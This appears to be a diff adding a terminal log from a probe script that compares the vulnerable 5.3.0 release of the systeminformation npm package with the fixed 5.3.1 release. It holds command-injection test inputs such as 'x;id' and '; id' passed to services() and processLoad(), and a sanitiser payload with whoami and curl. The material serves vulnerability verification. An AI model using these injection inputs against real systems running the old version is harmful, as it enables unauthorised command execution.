@@ -1,0 +1,37 @@
+$ npm install systeminformation@5.3.0 --prefix .tmp/old
+$ npm install systeminformation@5.3.1 --prefix .tmp/new
+$ node exploit/version_probe.js .tmp/old/node_modules/systeminformation
+
+=== 5.3.0 - the vulnerable release ===
+systeminformation 5.3.0
+
+[1] what the function accepts as its parameter
+  services('nginx')             accepted -> 1 row(s), first name: "nginx"
+  services(['nginx','sshd'])    accepted -> 1 row(s), first name: "nginxsshd"
+  services(['nginx','x;id'])    accepted -> 1 row(s), first name: "nginxx;id"
+  services({toString})          accepted -> 303 row(s), first name: "adpsvc"
+
+[2] processLoad, same contract
+  processLoad(['node','; id'])  accepted -> 1 row(s), first name: "node; id"
+
+[3] the sanitiser that both versions ship
+  sanitizeShellString(payload)  "nginx id  whoami  curl http://x/echo yid"
+  sanitizeShellString(strict)   "nginxidwhoamicurlhttp://x/echoyid"
+
+$ node exploit/version_probe.js .tmp/new/node_modules/systeminformation
+
+=== 5.3.1 - the fixed release ===
+systeminformation 5.3.1
+
+[1] what the function accepts as its parameter
+  services('nginx')             accepted -> 1 row(s), first name: "nginx"
+  services(['nginx','sshd'])    accepted -> []  (empty result - parameter rejected)
+  services(['nginx','x;id'])    accepted -> []  (empty result - parameter rejected)
+  services({toString})          accepted -> []  (empty result - parameter rejected)
+
+[2] processLoad, same contract
+  processLoad(['node','; id'])  accepted -> []  (empty result - parameter rejected)
+
+[3] the sanitiser that both versions ship
+  sanitizeShellString(payload)  "nginx id  whoami  curl http://x/echo yid"
+  sanitizeShellString(strict)   "nginxidwhoamicurlhttp://x/echoyid"
